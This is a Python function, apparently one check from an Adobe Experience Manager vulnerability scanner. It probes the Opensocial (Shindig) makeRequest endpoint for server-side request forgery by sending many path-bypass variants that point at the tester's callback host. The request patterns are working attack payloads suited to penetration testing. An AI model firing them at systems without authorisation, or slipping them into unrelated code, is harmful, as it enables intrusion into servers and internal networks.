import concurrent.futures
import itertools
import json
import datetime
import traceback
import sys
import argparse
import base64
import time
from collections import namedtuple
from http.server import BaseHTTPRequestHandler, HTTPServer
from random import choice, randint
from string import ascii_letters
from threading import Thread
import requests


@register('opensocial_makeRequest')
def ssrf_opensocial_makeRequest(base_url, my_host, debug=False, proxy=None):
    global token, d
    results = []
    MAKEREQUEST1 = itertools.product(('/libs/opensocial/makeRequest{0}?url={{0}}', '///libs///opensocial///makeRequest{0}?url={{0}}'), ('', '.json', '.1.json', '.4.2.1...json', '.html'))
    MAKEREQUEST1 = list((pair[0].format(pair[1]) for pair in MAKEREQUEST1))
    MAKEREQUEST2 = itertools.product(('/libs/opensocial/makeRequest{0}?url={{0}}', '///libs///opensocial///makeRequest{0}?url={{0}}'), ('/{0}.1.json', '/{0}.4.2.1...json', '/{0}.css', '/{0}.js', '/{0}.png', '/{0}.bmp', ';%0a{0}.css', ';%0a{0}.js', ';%0a{0}.png', ';%0a{0}.html', ';%0a{0}.ico', ';%0a{0}.png', '/{0}.ico', './{0}.html'))
    cache_buster = random_string()
    MAKEREQUEST2 = list((pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST2))
    MAKEREQUEST3 = itertools.product(('/libs/opensocial/makeRequest{0}?url={{0}}', '///libs///opensocial///makeRequest{0}?url={{0}}'), ('.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'))
    cache_buster = randint(1, (2 ** 12))
    MAKEREQUEST3 = list((pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST3))
    for path in itertools.chain(MAKEREQUEST1, MAKEREQUEST2, MAKEREQUEST3):
        url = normalize_url(base_url, path)
        encoded_orig_url = base64.b16encode(url.encode()).decode()
        back_url = 'http://{0}/{1}/opensocialmakerequest/{2}/'.format(my_host, token, encoded_orig_url)
        url = url.format(back_url)
        try:
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
            data = 'httpMethod=GET'
            http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy, debug=debug)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_opensocial_makeRequest', url=url)
    time.sleep(10)
    if ('opensocialmakerequest' in d):
        u = base64.b16decode(d.get('opensocialmakerequest')[0]).decode()
        f = Finding('Opensocial (shindig) makeRequest', u, 'SSRF via Opensocial (shindig) makeRequest. Yon can specify parameters httpMethod, postData, headers, contentType for makeRequest.')
        results.append(f)
    return results
